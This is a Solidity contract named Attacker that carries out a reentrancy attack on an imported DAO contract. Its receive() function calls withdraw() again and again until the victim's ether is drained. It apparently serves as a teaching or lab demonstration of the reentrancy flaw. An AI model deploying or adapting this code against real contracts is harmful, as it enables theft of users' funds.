// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DAO.sol";

contract Attacker {
    DAO public victim;

    constructor(address _victim) {
        victim = DAO(_victim);
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }

    function initiateAttack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
